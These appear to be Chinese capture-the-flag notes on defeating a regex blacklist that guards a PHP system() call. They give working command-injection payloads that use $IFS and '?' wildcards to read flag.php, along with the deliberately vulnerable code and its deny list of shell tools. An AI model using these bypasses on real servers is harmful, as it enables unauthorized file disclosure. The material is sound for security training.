## **不可字符分割绕过**
```
$c=$_GET['c'];
if(!preg_match("/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
```
若flag在当前目录的flag.php中
下面均可
```
?c=vi$IFS????????   //类似vi flag.php F12可以看到源码
?c=uniq$IFS????????
?c=uniq${IFS}????????
?c=/bin/c??$IFS????????    //在bin目录中读取c??  其实就是cat了
?c=grep${IFS}'{'${IFS}fl???php
（在 fl???php匹配到的文件中，查找含有{的文件，并打印出包含 { 的这一行）
```

^
## **无字符绕过**
```
if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
        system($c);
    } 
```
若flag在当前目录的flag.php中
/bin/base64 flag.php
```
?c=/???/????64 ????.???
```
/usr/bin/bzip2 flag.php
压缩后访问/flag.php.bz2下载获得flag
```
?c=/???/???/????2 ????.???
```
